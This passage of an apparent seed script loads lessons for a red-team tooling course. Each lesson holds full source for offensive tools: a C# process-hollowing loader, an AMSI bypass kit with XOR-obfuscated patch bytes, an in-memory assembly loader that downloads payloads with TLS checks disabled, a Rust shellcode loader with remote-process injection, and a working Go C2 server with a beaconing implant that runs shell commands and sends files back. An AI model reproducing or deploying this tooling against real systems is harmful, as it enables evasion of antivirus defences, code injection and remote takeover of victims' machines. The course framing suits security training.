            public IntPtr lpReserved2;
            public IntPtr hStdInput, hStdOutput, hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct CONTEXT64
        {
            public ulong P1Home, P2Home, P3Home, P4Home, P5Home, P6Home;
            public uint ContextFlags;
            public uint MxCsr;
            public ushort SegCs, SegDs, SegEs, SegFs, SegGs, SegSs;
            public uint EFlags;
            public ulong Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;
            public ulong Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi;
            public ulong R8, R9, R10, R11, R12, R13, R14, R15;
            public ulong Rip;
            // ... XMM registers omitted for brevity
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
            public byte[] ExtendedRegisters;
        }

        static void Main(string[] args)
        {
            if (args.Length < 2)
            {
                Console.WriteLine("Usage: ProcessHollowing.exe <target.exe> <payload.exe>");
                return;
            }

            string targetPath = args[0];
            byte[] payload = System.IO.File.ReadAllBytes(args[1]);

            Console.WriteLine("[*] Process Hollowing");
            Console.WriteLine($"[*] Target: {targetPath}");
            Console.WriteLine($"[*] Payload size: {payload.Length} bytes");

            // Create suspended process
            STARTUPINFO si = new STARTUPINFO();
            si.cb = (uint)Marshal.SizeOf(si);
            PROCESS_INFORMATION pi;

            if (!CreateProcess(targetPath, null, IntPtr.Zero, IntPtr.Zero,
                false, CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi))
            {
                Console.WriteLine("[-] CreateProcess failed");
                return;
            }
            Console.WriteLine($"[+] Created suspended process: PID {pi.dwProcessId}");

            // Get thread context
            CONTEXT64 ctx = new CONTEXT64();
            ctx.ContextFlags = (uint)CONTEXT_FULL;
            if (!GetThreadContext(pi.hThread, ref ctx))
            {
                Console.WriteLine("[-] GetThreadContext failed");
                return;
            }

            // Read PEB to get image base
            byte[] pebBuffer = new byte[8];
            int bytesRead;
            ReadProcessMemory(pi.hProcess, (IntPtr)(ctx.Rdx + 0x10), pebBuffer, 8, out bytesRead);
            ulong imageBase = BitConverter.ToUInt64(pebBuffer, 0);
            Console.WriteLine($"[+] Original image base: 0x{imageBase:X}");

            // Unmap original image
            NtUnmapViewOfSection(pi.hProcess, (IntPtr)imageBase);
            Console.WriteLine("[+] Unmapped original section");

            // Parse payload PE headers
            // ... (implement PE parsing)

            // Allocate and write payload
            // ... (implement)

            // Update entry point and resume
            // ctx.Rcx = newEntryPoint;
            // SetThreadContext(pi.hThread, ref ctx);
            // ResumeThread(pi.hThread);

            Console.WriteLine("[+] Done");
        }
    }
}
\`\`\`

### Exercises
1. Complete the PE parsing
2. Add support for x86 processes
3. Implement argument spoofing
4. Add parent PID spoofing`, 0, now);

insertTask.run(csMod1.lastInsertRowid, 'Implement AMSI Bypass Techniques', 'Patch the AmsiScanBuffer function in memory to return clean results, or unhook AMSI entirely by overwriting the amsi.dll scanning routines to allow execution of flagged PowerShell and .NET payloads', `## AMSI Bypass in C#

### Multiple Bypass Techniques
\`\`\`csharp
using System;
using System.Runtime.InteropServices;
using System.Reflection;

namespace AMSIBypass
{
    class Program
    {
        // Method 1: Patch AmsiScanBuffer
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        static extern bool VirtualProtect(
            IntPtr lpAddress,
            UIntPtr dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        static bool PatchAmsiScanBuffer()
        {
            Console.WriteLine("[*] Method 1: Patching AmsiScanBuffer");

            IntPtr amsi = LoadLibrary("amsi.dll");
            if (amsi == IntPtr.Zero)
            {
                Console.WriteLine("[+] amsi.dll not loaded - bypass not needed");
                return true;
            }

            IntPtr asb = GetProcAddress(amsi, "AmsiScanBuffer");
            if (asb == IntPtr.Zero)
            {
                Console.WriteLine("[-] Could not find AmsiScanBuffer");
                return false;
            }

            Console.WriteLine($"[*] AmsiScanBuffer at: 0x{asb.ToInt64():X}");

            // Patch bytes: mov eax, 0x80070057 (E_INVALIDARG); ret
            byte[] patch;
            if (IntPtr.Size == 8)
            {
                patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            }
            else
            {
                patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
            }

            uint oldProtect;
            if (!VirtualProtect(asb, (UIntPtr)patch.Length, 0x40, out oldProtect))
            {
                Console.WriteLine("[-] VirtualProtect failed");
                return false;
            }

            Marshal.Copy(patch, 0, asb, patch.Length);

            uint temp;
            VirtualProtect(asb, (UIntPtr)patch.Length, oldProtect, out temp);

            Console.WriteLine("[+] AmsiScanBuffer patched!");
            return true;
        }

        // Method 2: Using reflection to set amsiInitFailed
        static bool SetAmsiInitFailed()
        {
            Console.WriteLine("[*] Method 2: Setting amsiInitFailed via reflection");

            try
            {
                var amsiUtils = typeof(System.Management.Automation.PSObject).Assembly
                    .GetType("System.Management.Automation.AmsiUtils");

                if (amsiUtils == null)
                {
                    Console.WriteLine("[-] Could not find AmsiUtils");
                    return false;
                }

                var field = amsiUtils.GetField("amsiInitFailed",
                    BindingFlags.NonPublic | BindingFlags.Static);

                if (field == null)
                {
                    Console.WriteLine("[-] Could not find amsiInitFailed field");
                    return false;
                }

                field.SetValue(null, true);
                Console.WriteLine("[+] amsiInitFailed set to true!");
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Exception: {ex.Message}");
                return false;
            }
        }

        // Method 3: Forcing an error by corrupting amsiContext
        static bool CorruptAmsiContext()
        {
            Console.WriteLine("[*] Method 3: Corrupting amsiContext");

            try
            {
                var amsiUtils = typeof(System.Management.Automation.PSObject).Assembly
                    .GetType("System.Management.Automation.AmsiUtils");

                var context = amsiUtils.GetField("amsiContext",
                    BindingFlags.NonPublic | BindingFlags.Static);

                if (context == null)
                {
                    Console.WriteLine("[-] Could not find amsiContext");
                    return false;
                }

                // Set context to zero to force error
                context.SetValue(null, IntPtr.Zero);
                Console.WriteLine("[+] amsiContext corrupted!");
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Exception: {ex.Message}");
                return false;
            }
        }

        // Method 4: Hardware breakpoint on AmsiScanBuffer
        // ... (requires SEH manipulation)

        static void Main(string[] args)
        {
            Console.WriteLine("=== AMSI Bypass Toolkit ===\\n");

            // Try methods in order
            if (!PatchAmsiScanBuffer())
            {
                if (!SetAmsiInitFailed())
                {
                    CorruptAmsiContext();
                }
            }

            Console.WriteLine("\\n[*] Testing bypass...");

            // Test with known bad string
            string test = "Invoke-Mimikatz";
            Console.WriteLine($"[*] Test string: {test}");
            Console.WriteLine("[+] If you see this, AMSI is bypassed!");
        }
    }
}
\`\`\`

### Obfuscated Version
\`\`\`csharp
// Bypass using string obfuscation to avoid static detection
static bool StealthBypass()
{
    // Obfuscated: "amsi.dll"
    string lib = Encoding.UTF8.GetString(new byte[] {
        0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c });

    // Obfuscated: "AmsiScanBuffer"
    string func = Encoding.UTF8.GetString(new byte[] {
        0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e,
        0x42, 0x75, 0x66, 0x66, 0x65, 0x72 });

    IntPtr addr = GetProcAddress(LoadLibrary(lib), func);

    // XOR'd patch bytes
    byte[] enc = new byte[] { 0x93, 0x62, 0x05, 0x02, 0x85, 0xd6 };
    byte key = 0x25;
    for (int i = 0; i < enc.Length; i++) enc[i] ^= key;

    uint old;
    VirtualProtect(addr, (UIntPtr)enc.Length, 0x40, out old);
    Marshal.Copy(enc, 0, addr, enc.Length);
    VirtualProtect(addr, (UIntPtr)enc.Length, old, out old);

    return true;
}
\`\`\``, 1, now);

insertTask.run(csMod1.lastInsertRowid, 'Build In-Memory Assembly Loader', 'Load and execute .NET assemblies directly from memory using Assembly.Load with byte arrays, avoiding disk writes and file-based detection while supporting argument passing and output capture', `## In-Memory Assembly Execution in C#

### Assembly Loader
\`\`\`csharp
using System;
using System.IO;
using System.Net;
using System.Reflection;
using System.Security.Cryptography;

namespace AssemblyLoader
{
    class Program
    {
        // Load assembly from bytes
        static Assembly LoadFromBytes(byte[] assemblyBytes)
        {
            return Assembly.Load(assemblyBytes);
        }

        // Load from URL
        static byte[] DownloadAssembly(string url)
        {
            using (WebClient client = new WebClient())
            {
                // Bypass SSL errors for testing
                ServicePointManager.ServerCertificateValidationCallback =
                    (s, cert, chain, errors) => true;

                return client.DownloadData(url);
            }
        }

        // XOR decrypt
        static byte[] XorDecrypt(byte[] data, byte[] key)
        {
            byte[] result = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
            {
                result[i] = (byte)(data[i] ^ key[i % key.Length]);
            }
            return result;
        }

        // AES decrypt
        static byte[] AesDecrypt(byte[] data, byte[] key, byte[] iv)
        {
            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;

                using (var decryptor = aes.CreateDecryptor())
                using (var ms = new MemoryStream(data))
                using (var cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
                using (var result = new MemoryStream())
                {
                    cs.CopyTo(result);
                    return result.ToArray();
                }
            }
        }

        // Execute assembly's entry point
        static void ExecuteAssembly(Assembly asm, string[] args)
        {
            MethodInfo entryPoint = asm.EntryPoint;

            if (entryPoint == null)
            {
                Console.WriteLine("[-] No entry point found");
                return;
            }

            Console.WriteLine($"[+] Entry point: {entryPoint.DeclaringType}.{entryPoint.Name}");

            // Handle different parameter types
            ParameterInfo[] parameters = entryPoint.GetParameters();

            object[] invokeParams = null;
            if (parameters.Length > 0)
            {
                invokeParams = new object[] { args };
            }

            // Create instance if needed
            object instance = null;
            if (!entryPoint.IsStatic)
            {
                instance = Activator.CreateInstance(entryPoint.DeclaringType);
            }

            // Invoke
            entryPoint.Invoke(instance, invokeParams);
        }

        // Execute specific method
        static object ExecuteMethod(Assembly asm, string typeName,
            string methodName, object[] args)
        {
            Type type = asm.GetType(typeName);
            if (type == null)
            {
                throw new Exception($"Type not found: {typeName}");
            }

            MethodInfo method = type.GetMethod(methodName,
                BindingFlags.Public | BindingFlags.Static | BindingFlags.Instance);

            if (method == null)
            {
                throw new Exception($"Method not found: {methodName}");
            }

            object instance = null;
            if (!method.IsStatic)
            {
                instance = Activator.CreateInstance(type);
            }

            return method.Invoke(instance, args);
        }

        static void Main(string[] args)
        {
            Console.WriteLine("=== In-Memory Assembly Loader ===\\n");

            if (args.Length < 1)
            {
                Console.WriteLine("Usage:");
                Console.WriteLine("  Loader.exe <assembly.exe> [args...]");
                Console.WriteLine("  Loader.exe -url <http://url/assembly.exe>");
                Console.WriteLine("  Loader.exe -enc <encrypted.bin> <key>");
                return;
            }

            byte[] assemblyBytes = null;
            string[] passArgs = new string[0];

            if (args[0] == "-url")
            {
                Console.WriteLine($"[*] Downloading from: {args[1]}");
                assemblyBytes = DownloadAssembly(args[1]);
                if (args.Length > 2)
                {
                    passArgs = new string[args.Length - 2];
                    Array.Copy(args, 2, passArgs, 0, args.Length - 2);
                }
            }
            else if (args[0] == "-enc")
            {
                Console.WriteLine("[*] Loading encrypted assembly");
                byte[] encrypted = File.ReadAllBytes(args[1]);
                byte[] key = System.Text.Encoding.UTF8.GetBytes(args[2]);
                assemblyBytes = XorDecrypt(encrypted, key);
            }
            else
            {
                Console.WriteLine($"[*] Loading from file: {args[0]}");
                assemblyBytes = File.ReadAllBytes(args[0]);
                if (args.Length > 1)
                {
                    passArgs = new string[args.Length - 1];
                    Array.Copy(args, 1, passArgs, 0, args.Length - 1);
                }
            }

            Console.WriteLine($"[+] Assembly size: {assemblyBytes.Length} bytes");

            // Load assembly
            Assembly asm = LoadFromBytes(assemblyBytes);
            Console.WriteLine($"[+] Loaded: {asm.FullName}");

            // Execute
            Console.WriteLine("[*] Executing...\\n");
            ExecuteAssembly(asm, passArgs);
        }
    }
}
\`\`\`

### Exercises
1. Add AppDomain isolation
2. Implement assembly encryption tool
3. Add CLR hosting from unmanaged code
4. Create PowerShell cradle`, 2, now);

// ============================================================================
// RUST RED TEAM TOOLS
// ============================================================================
const rustPath = insertPath.run(
	'Red Team Tooling: Rust',
	'Build fast, safe, and stealthy offensive tools in Rust. Learn systems programming with memory safety, create cross-platform implants, and leverage Rust\'s unique features for evasion.',
	'orange',
	'Rust',
	'advanced',
	10,
	'Systems programming, memory safety, FFI, async/await, cross-compilation, Windows API',
	now
);

const rustMod1 = insertModule.run(rustPath.lastInsertRowid, 'Rust Offensive Fundamentals', 'Core Rust skills for security tool development', 0, now);

insertTask.run(rustMod1.lastInsertRowid, 'Build a Rust Port Scanner with Async', 'Implement a concurrent TCP port scanner using Tokio async runtime with configurable parallelism, timeout handling, service banner grabbing, and efficient socket management for scanning large IP ranges', `## Async Port Scanner in Rust

### Cargo.toml
\`\`\`toml
[package]
name = "rscan"
version = "0.1.0"
edition = "2021"

[dependencies]
tokio = { version = "1.0", features = ["full"] }
clap = { version = "4.0", features = ["derive"] }
futures = "0.3"
\`\`\`

### Implementation
\`\`\`rust
// src/main.rs
use clap::Parser;
use futures::stream::{self, StreamExt};
use std::net::{IpAddr, SocketAddr};
use std::time::Duration;
use tokio::net::TcpStream;
use tokio::time::timeout;

#[derive(Parser)]
#[command(name = "rscan")]
#[command(about = "Fast async port scanner in Rust")]
struct Args {
    /// Target IP address
    target: IpAddr,

    /// Port range start
    #[arg(short = 's', long, default_value = "1")]
    start: u16,

    /// Port range end
    #[arg(short = 'e', long, default_value = "1000")]
    end: u16,

    /// Connection timeout in ms
    #[arg(short, long, default_value = "1000")]
    timeout: u64,

    /// Concurrent connections
    #[arg(short, long, default_value = "500")]
    concurrency: usize,
}

async fn scan_port(target: IpAddr, port: u16, timeout_ms: u64) -> Option<u16> {
    let addr = SocketAddr::new(target, port);
    let timeout_duration = Duration::from_millis(timeout_ms);

    match timeout(timeout_duration, TcpStream::connect(addr)).await {
        Ok(Ok(_)) => Some(port),
        _ => None,
    }
}

#[tokio::main]
async fn main() {
    let args = Args::parse();

    println!("╔══════════════════════════════════════╗");
    println!("║           RScan - Rust Scanner        ║");
    println!("╠══════════════════════════════════════╣");
    println!("║ Target: {:^28} ║", args.target);
    println!("║ Ports:  {:^28} ║", format!("{}-{}", args.start, args.end));
    println!("╚══════════════════════════════════════╝");
    println!();

    let ports: Vec<u16> = (args.start..=args.end).collect();
    let total = ports.len();

    let start = std::time::Instant::now();

    let open_ports: Vec<u16> = stream::iter(ports)
        .map(|port| scan_port(args.target, port, args.timeout))
        .buffer_unordered(args.concurrency)
        .filter_map(|result| async { result })
        .collect()
        .await;

    let elapsed = start.elapsed();

    println!("Open ports:");
    let mut sorted = open_ports.clone();
    sorted.sort();
    for port in sorted {
        let service = get_service_name(port);
        println!("  {} {} {}", port, "tcp".to_string(), service);
    }

    println!("\\n{} ports scanned in {:.2}s", total, elapsed.as_secs_f64());
    println!("{} open ports found", open_ports.len());
}

fn get_service_name(port: u16) -> &'static str {
    match port {
        21 => "ftp",
        22 => "ssh",
        23 => "telnet",
        25 => "smtp",
        53 => "dns",
        80 => "http",
        110 => "pop3",
        143 => "imap",
        443 => "https",
        445 => "smb",
        3306 => "mysql",
        3389 => "rdp",
        5432 => "postgres",
        8080 => "http-proxy",
        _ => "",
    }
}
\`\`\`

### Build & Run
\`\`\`bash
cargo build --release
./target/release/rscan 192.168.1.1 -s 1 -e 65535 -c 1000
\`\`\``, 0, now);

insertTask.run(rustMod1.lastInsertRowid, 'Create Windows Shellcode Loader in Rust', 'Build a shellcode executor using Rust windows-sys crate to allocate RWX memory with VirtualAlloc, copy position-independent shellcode, and transfer execution via function pointer casting or CreateThread', `## Rust Shellcode Loader

### Cargo.toml
\`\`\`toml
[package]
name = "shellcode_loader"
version = "0.1.0"
edition = "2021"

[dependencies]
windows = { version = "0.48", features = [
    "Win32_Foundation",
    "Win32_System_Memory",
    "Win32_System_Threading",
    "Win32_Security"
]}
\`\`\`

### Implementation
\`\`\`rust
use windows::Win32::Foundation::*;
use windows::Win32::System::Memory::*;
use windows::Win32::System::Threading::*;
use std::ptr;

// XOR decrypt shellcode
fn xor_decrypt(data: &[u8], key: &[u8]) -> Vec<u8> {
    data.iter()
        .enumerate()
        .map(|(i, &b)| b ^ key[i % key.len()])
        .collect()
}

fn execute_shellcode(shellcode: &[u8]) -> Result<(), String> {
    unsafe {
        // Allocate RWX memory
        let addr = VirtualAlloc(
            Some(ptr::null()),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        if addr.is_null() {
            return Err("VirtualAlloc failed".to_string());
        }

        println!("[+] Allocated {} bytes at {:?}", shellcode.len(), addr);

        // Copy shellcode
        ptr::copy_nonoverlapping(
            shellcode.as_ptr(),
            addr as *mut u8,
            shellcode.len(),
        );

        println!("[+] Shellcode copied to memory");

        // Create thread
        let mut thread_id: u32 = 0;
        let thread = CreateThread(
            Some(ptr::null()),
            0,
            Some(std::mem::transmute(addr)),
            Some(ptr::null()),
            THREAD_CREATE_RUN_IMMEDIATELY,
            Some(&mut thread_id),
        );

        match thread {
            Ok(handle) => {
                println!("[+] Thread created: {}", thread_id);
                WaitForSingleObject(handle, INFINITE);
                CloseHandle(handle);
                Ok(())
            }
            Err(e) => Err(format!("CreateThread failed: {:?}", e)),
        }
    }
}

fn main() {
    println!("=== Rust Shellcode Loader ===\\n");

    // Encrypted calc.exe shellcode (placeholder)
    let encrypted: &[u8] = &[
        // XOR encrypted shellcode bytes here
        0x00, 0x00, 0x00, // ...
    ];

    let key = b"secretkey123";

    println!("[*] Decrypting shellcode...");
    let shellcode = xor_decrypt(encrypted, key);

    println!("[*] Executing shellcode...");
    match execute_shellcode(&shellcode) {
        Ok(_) => println!("[+] Execution complete"),
        Err(e) => println!("[-] Error: {}", e),
    }
}
\`\`\`

### Alternative: Process Injection
\`\`\`rust
use windows::Win32::System::Threading::*;
use windows::Win32::System::Diagnostics::Debug::*;

fn inject_into_process(pid: u32, shellcode: &[u8]) -> Result<(), String> {
    unsafe {
        // Open target process
        let process = OpenProcess(
            PROCESS_ALL_ACCESS,
            false,
            pid,
        )?;

        // Allocate in remote process
        let remote_addr = VirtualAllocEx(
            process,
            Some(ptr::null()),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        if remote_addr.is_null() {
            CloseHandle(process);
            return Err("VirtualAllocEx failed".to_string());
        }

        // Write shellcode
        let mut bytes_written = 0;
        WriteProcessMemory(
            process,
            remote_addr,
            shellcode.as_ptr() as *const _,
            shellcode.len(),
            Some(&mut bytes_written),
        );

        // Create remote thread
        let thread = CreateRemoteThread(
            process,
            Some(ptr::null()),
            0,
            Some(std::mem::transmute(remote_addr)),
            Some(ptr::null()),
            0,
            Some(ptr::null_mut()),
        )?;

        WaitForSingleObject(thread, INFINITE);
        CloseHandle(thread);
        CloseHandle(process);

        Ok(())
    }
}
\`\`\``, 1, now);

// ============================================================================
// GO RED TEAM TOOLS
// ============================================================================
const goPath = insertPath.run(
	'Red Team Tooling: Go',
	'Build cross-platform offensive tools in Go. Create portable implants, network tools, and automation scripts with easy deployment.',
	'cyan',
	'Go',
	'advanced',
	10,
	'Networking, concurrency, cross-compilation, C2 frameworks, protocol implementation',
	now
);

const goMod1 = insertModule.run(goPath.lastInsertRowid, 'Go Offensive Fundamentals', 'Core Go skills for security tools', 0, now);

insertTask.run(goMod1.lastInsertRowid, 'Build a Go HTTP C2 Server', 'Develop a command and control server in Go with HTTP/S listeners, agent registration, task queuing, encrypted communications using AES-GCM, and a REST API for operator interaction and implant management', `## Go HTTP C2 Server

### Server Implementation
\`\`\`go
// server/main.go
package main

import (
    "encoding/base64"
    "encoding/json"
    "fmt"
    "log"
    "net/http"
    "sync"
    "time"
)

type Agent struct {
    ID           string    \`json:"id"\`
    Hostname     string    \`json:"hostname"\`
    Username     string    \`json:"username"\`
    OS           string    \`json:"os"\`
    LastSeen     time.Time \`json:"last_seen"\`
    PendingTasks []Task    \`json:"-"\`
}

type Task struct {
    ID      string \`json:"id"\`
    Command string \`json:"command"\`
    Args    string \`json:"args"\`
}

type TaskResult struct {
    TaskID  string \`json:"task_id"\`
    AgentID string \`json:"agent_id"\`
    Output  string \`json:"output"\`
    Success bool   \`json:"success"\`
}

type C2Server struct {
    agents  map[string]*Agent
    results []TaskResult
    mu      sync.RWMutex
}

func NewC2Server() *C2Server {
    return &C2Server{
        agents:  make(map[string]*Agent),
        results: make([]TaskResult, 0),
    }
}

// Agent registration
func (c *C2Server) handleRegister(w http.ResponseWriter, r *http.Request) {
    var agent Agent
    if err := json.NewDecoder(r.Body).Decode(&agent); err != nil {
        http.Error(w, "Invalid request", http.StatusBadRequest)
        return
    }

    agent.LastSeen = time.Now()
    agent.PendingTasks = make([]Task, 0)

    c.mu.Lock()
    c.agents[agent.ID] = &agent
    c.mu.Unlock()

    log.Printf("[+] Agent registered: %s (%s@%s)", agent.ID, agent.Username, agent.Hostname)

    w.WriteHeader(http.StatusOK)
    json.NewEncoder(w).Encode(map[string]string{"status": "registered"})
}

// Agent beacon - get tasks
func (c *C2Server) handleBeacon(w http.ResponseWriter, r *http.Request) {
    agentID := r.URL.Query().Get("id")

    c.mu.Lock()
    agent, exists := c.agents[agentID]
    if !exists {
        c.mu.Unlock()
        http.Error(w, "Unknown agent", http.StatusNotFound)
        return
    }

    agent.LastSeen = time.Now()
    tasks := agent.PendingTasks
    agent.PendingTasks = make([]Task, 0)
    c.mu.Unlock()

    json.NewEncoder(w).Encode(tasks)
}

// Agent result submission
func (c *C2Server) handleResult(w http.ResponseWriter, r *http.Request) {
    var result TaskResult
    if err := json.NewDecoder(r.Body).Decode(&result); err != nil {
        http.Error(w, "Invalid request", http.StatusBadRequest)
        return
    }

    // Decode base64 output
    output, _ := base64.StdEncoding.DecodeString(result.Output)
    result.Output = string(output)

    c.mu.Lock()
    c.results = append(c.results, result)
    c.mu.Unlock()

    log.Printf("[+] Result from %s: %s", result.AgentID, result.TaskID)

    w.WriteHeader(http.StatusOK)
}

// Operator: list agents
func (c *C2Server) handleListAgents(w http.ResponseWriter, r *http.Request) {
    c.mu.RLock()
    defer c.mu.RUnlock()

    agents := make([]*Agent, 0, len(c.agents))
    for _, agent := range c.agents {
        agents = append(agents, agent)
    }

    json.NewEncoder(w).Encode(agents)
}

// Operator: task agent
func (c *C2Server) handleTask(w http.ResponseWriter, r *http.Request) {
    agentID := r.URL.Query().Get("agent")

    var task Task
    if err := json.NewDecoder(r.Body).Decode(&task); err != nil {
        http.Error(w, "Invalid request", http.StatusBadRequest)
        return
    }

    task.ID = fmt.Sprintf("task_%d", time.Now().UnixNano())

    c.mu.Lock()
    agent, exists := c.agents[agentID]
    if exists {
        agent.PendingTasks = append(agent.PendingTasks, task)
    }
    c.mu.Unlock()

    if !exists {
        http.Error(w, "Agent not found", http.StatusNotFound)
        return
    }

    log.Printf("[*] Task queued for %s: %s %s", agentID, task.Command, task.Args)
    json.NewEncoder(w).Encode(task)
}

// Operator: get results
func (c *C2Server) handleResults(w http.ResponseWriter, r *http.Request) {
    c.mu.RLock()
    defer c.mu.RUnlock()

    json.NewEncoder(w).Encode(c.results)
}

func main() {
    server := NewC2Server()

    // Agent endpoints
    http.HandleFunc("/api/register", server.handleRegister)
    http.HandleFunc("/api/beacon", server.handleBeacon)
    http.HandleFunc("/api/result", server.handleResult)

    // Operator endpoints
    http.HandleFunc("/api/agents", server.handleListAgents)
    http.HandleFunc("/api/task", server.handleTask)
    http.HandleFunc("/api/results", server.handleResults)

    fmt.Println("=== Go C2 Server ===")
    fmt.Println("Agent endpoints:")
    fmt.Println("  POST /api/register - Register agent")
    fmt.Println("  GET  /api/beacon   - Get tasks")
    fmt.Println("  POST /api/result   - Submit result")
    fmt.Println("\\nOperator endpoints:")
    fmt.Println("  GET  /api/agents   - List agents")
    fmt.Println("  POST /api/task     - Queue task")
    fmt.Println("  GET  /api/results  - Get results")
    fmt.Println("\\nListening on :8080...")

    log.Fatal(http.ListenAndServe(":8080", nil))
}
\`\`\`

### Build
\`\`\`bash
go build -o c2server server/main.go
\`\`\``, 0, now);

insertTask.run(goMod1.lastInsertRowid, 'Create a Go C2 Implant', 'Develop a cross-platform beacon implant in Go that compiles to standalone binaries for Windows, Linux, and macOS, featuring HTTP/S callbacks, sleep jitter, command execution, and modular post-exploitation capabilities', `## Go C2 Implant

### Implementation
\`\`\`go
// implant/main.go
package main

import (
    "bytes"
    "encoding/base64"
    "encoding/json"
    "fmt"
    "net/http"
    "os"
    "os/exec"
    "os/user"
    "runtime"
    "time"
)

type Agent struct {
    ID       string \`json:"id"\`
    Hostname string \`json:"hostname"\`
    Username string \`json:"username"\`
    OS       string \`json:"os"\`
}

type Task struct {
    ID      string \`json:"id"\`
    Command string \`json:"command"\`
    Args    string \`json:"args"\`
}

type TaskResult struct {
    TaskID  string \`json:"task_id"\`
    AgentID string \`json:"agent_id"\`
    Output  string \`json:"output"\`
    Success bool   \`json:"success"\`
}

var (
    c2Server   = "http://localhost:8080"
    beaconTime = 5 * time.Second
    jitter     = 2 * time.Second
)

func generateID() string {
    hostname, _ := os.Hostname()
    return fmt.Sprintf("%s_%d", hostname, time.Now().Unix())
}

func register(agent Agent) error {
    data, _ := json.Marshal(agent)
    resp, err := http.Post(c2Server+"/api/register", "application/json", bytes.NewBuffer(data))
    if err != nil {
        return err
    }
    defer resp.Body.Close()
    return nil
}

func beacon(agentID string) ([]Task, error) {
    resp, err := http.Get(c2Server + "/api/beacon?id=" + agentID)
    if err != nil {
        return nil, err
    }
    defer resp.Body.Close()

    var tasks []Task
    json.NewDecoder(resp.Body).Decode(&tasks)
    return tasks, nil
}

func sendResult(result TaskResult) error {
    data, _ := json.Marshal(result)
    resp, err := http.Post(c2Server+"/api/result", "application/json", bytes.NewBuffer(data))
    if err != nil {
        return err
    }
    defer resp.Body.Close()
    return nil
}

func executeTask(task Task) TaskResult {
    result := TaskResult{
        TaskID:  task.ID,
        Success: true,
    }

    var output string
    var err error

    switch task.Command {
    case "shell":
        output, err = runShell(task.Args)
    case "download":
        output, err = downloadFile(task.Args)
    case "upload":
        output, err = uploadFile(task.Args)
    case "ps":
        output, err = listProcesses()
    case "whoami":
        output = currentUser()
    case "pwd":
        output, _ = os.Getwd()
    case "cd":
        err = os.Chdir(task.Args)
        if err == nil {
            output, _ = os.Getwd()
        }
    case "exit":
        os.Exit(0)
    default:
        output = "Unknown command: " + task.Command
        result.Success = false
    }

    if err != nil {
        output = err.Error()
        result.Success = false
    }

    result.Output = base64.StdEncoding.EncodeToString([]byte(output))
    return result
}

func runShell(command string) (string, error) {
    var cmd *exec.Cmd

    if runtime.GOOS == "windows" {
        cmd = exec.Command("cmd", "/c", command)
    } else {
        cmd = exec.Command("/bin/sh", "-c", command)
    }

    output, err := cmd.CombinedOutput()
    return string(output), err
}

func downloadFile(path string) (string, error) {
    data, err := os.ReadFile(path)
    if err != nil {
        return "", err
    }
    return base64.StdEncoding.EncodeToString(data), nil
}

func uploadFile(args string) (string, error) {
    // Format: path|base64data
    return "Not implemented", nil
}

func listProcesses() (string, error) {
    if runtime.GOOS == "windows" {
        return runShell("tasklist")
    }
    return runShell("ps aux")
}

func currentUser() string {
    u, err := user.Current()
    if err != nil {
        return "unknown"
    }
    return u.Username
}

func main() {
    // Build agent info
    hostname, _ := os.Hostname()
    currentUser, _ := user.Current()

    agent := Agent{
        ID:       generateID(),
        Hostname: hostname,
        Username: currentUser.Username,
        OS:       runtime.GOOS,
    }

    fmt.Printf("[*] Agent ID: %s\\n", agent.ID)
    fmt.Printf("[*] C2 Server: %s\\n", c2Server)

    // Register
    for {
        if err := register(agent); err == nil {
            fmt.Println("[+] Registered successfully")
            break
        }
        fmt.Println("[-] Registration failed, retrying...")
        time.Sleep(beaconTime)
    }

    // Main loop
    for {
        tasks, err := beacon(agent.ID)
        if err != nil {
            fmt.Printf("[-] Beacon error: %v\\n", err)
        } else {
            for _, task := range tasks {
                fmt.Printf("[*] Task received: %s %s\\n", task.Command, task.Args)
                result := executeTask(task)
                result.AgentID = agent.ID
                sendResult(result)
            }
        }

        // Sleep with jitter
        sleep := beaconTime + time.Duration(time.Now().UnixNano()%int64(jitter))
        time.Sleep(sleep)
    }
}
\`\`\`

### Build for Multiple Platforms
\`\`\`bash
# Linux
GOOS=linux GOARCH=amd64 go build -o implant_linux implant/main.go

# Windows
GOOS=windows GOARCH=amd64 go build -o implant.exe implant/main.go

# macOS
GOOS=darwin GOARCH=amd64 go build -o implant_macos implant/main.go
\`\`\``, 1, now);

// ============================================================================
// PYTHON RED TEAM TOOLS
// ============================================================================
const pyPath = insertPath.run(
	'Red Team Tooling: Python',
	'Rapid development of offensive tools using Python. Build exploitation scripts, automate attacks, and create proof-of-concept tools quickly.',
	'blue',
	'Python',
	'intermediate',
	8,
	'Exploitation, scripting, networking, web attacks, Active Directory, automation',
	now
);

const pyMod1 = insertModule.run(pyPath.lastInsertRowid, 'Python Offensive Scripting', 'Rapid offensive tool development', 0, now);

insertTask.run(pyMod1.lastInsertRowid, 'Build an AD Enumeration Tool', 'Query Active Directory via LDAP using Python ldap3 library to enumerate users, groups, computers, SPNs, delegation settings, and ACLs for mapping the domain and identifying attack vectors', `## Python AD Enumerator

### Implementation
\`\`\`python
#!/usr/bin/env python3
"""
ad_enum.py - Active Directory Enumeration Tool
